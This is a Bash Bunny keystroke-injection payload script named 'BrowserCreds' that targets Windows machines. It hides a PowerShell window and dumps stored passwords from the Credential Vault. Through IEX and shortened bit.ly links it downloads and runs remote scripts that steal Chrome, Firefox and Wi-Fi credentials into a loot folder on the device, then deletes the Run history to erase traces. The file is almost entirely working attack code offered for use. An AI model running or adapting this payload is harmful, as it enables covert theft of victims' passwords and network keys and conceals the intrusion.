#!/bin/bash
#
# Title:         BrowserCreds
# Author:        illwill
# Version:       0.1
#
# Dumps the stored plaintext Browser passwords from Windows boxes downloading a Powershell script
# then stashes them in /root/udisk/loot/BrowserCreds/%ComputerName%
# Credits to these guys for their powershell scripts:
# https://github.com/sekirkity/BrowserGather BrowserGather.ps1
# https://github.com/EmpireProject/Empire    Get-FoxDump.ps1
#
#
# WLAN Extension: QDBA


# White..............Some Preps
# Purple.............Start Powershell 
# Red................Running Script
# Green..............Got All Creds (Script finished)


LED R G B
LOOTDIR=/root/udisk/loot/BrowserCreds
mkdir -p $LOOTDIR

ATTACKMODE HID STORAGE
LED R B
Q SET_LANGUAGE DE

# wait 6 seconds for the storage to popup
Q DELAY 6000
Q GUI r
Q DELAY 100
Q STRING POWERSHELL
Q ENTER
Q DELAY 500
# Minimize Console
Q STRING  \$w\=\'black\'\;\$con\=\$host.UI.RawUI\;\$con.BackgroundColor\=\$w\;\$con.ForegroundColor\=\$w\;\$size\=\$con.WindowSize\;\$size.Width\=20\;\$size.Height\=1\;\$con.WindowSize\=\$size\;
Q STRING \$host.PrivateData.ErrorForegroundColor\=\$w\;\$host.PrivateData.ErrorBackgroundColor\=\$w\;Clear\-Host
Q ENTER
Q DELAY 100
# Go on....
Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
Q ENTER
Q DELAY 100

LED R
#Dump Credential Vault (I.E./Edge)
Q STRING \$ClassHolder \= \[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType\=WindowsRuntime\]\;
Q STRING \$VaultObj \= new-object Windows.Security.Credentials.PasswordVault\; \$VaultObj.RetrieveAll\(\) \| 
Q STRING foreach \{ \$_.RetrievePassword\(\)\; \$_ \} \|
Q STRING select Resource, UserName, Password \| Sort-Object Resource \| ft -AutoSize \| Out-File \$Bunny\\loot\\BrowserCreds\\\$env:computername.txt
Q ENTER
Q DELAY 100

LED R
#Dump Chrome Creds
Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2mFjedI\'\)\; Get-ChromeCreds \| ft -AutoSize \| Out-File -Append \$Bunny\\loot\\BrowserCreds\\\$env:computername.txt
Q ENTER
Q DELAY 100

#
# Dump WLAN Creds 
Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2nqPiqa\'\)\; Get-WlanInfo \| ft -AutoSize \| Out-File -Append \$Bunny\\loot\\BrowserCreds\\\$env:computername.txt
Q ENTER
Q DELAY 100
Q STRING exit
Q ENTER
Q DELAY 1000

LED R
#Open 32bit powershell and Dump Firefox Creds
Q GUI r
Q DELAY 100
Q STRING \%SystemRoot\%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe
Q ENTER
Q DELAY 500
# Minimize Console
Q STRING  \$w\=\'black\'\;\$con\=\$host.UI.RawUI\;\$con.BackgroundColor\=\$w\;\$con.ForegroundColor\=\$w\;\$size\=\$con.WindowSize\;\$size.Width\=20\;\$size.Height\=1\;\$con.WindowSize\=\$size\;
Q STRING \$host.PrivateData.ErrorForegroundColor\=\$w\;\$host.PrivateData.ErrorBackgroundColor\=\$w
Q ENTER
Q DELAY 100
# Go on ....
Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
Q ENTER
Q DELAY 100
Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2not5sV\'\)\; Get-FoxDump \| Out-File -Append \$Bunny\\loot\\BrowserCreds\\\$env:computername.txt
Q ENTER
Q DELAY 100

# Clear the Run history and exit
Q STRING Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
Q ENTER
Q DELAY 100
Q STRING exit
Q ENTER

sync

LED G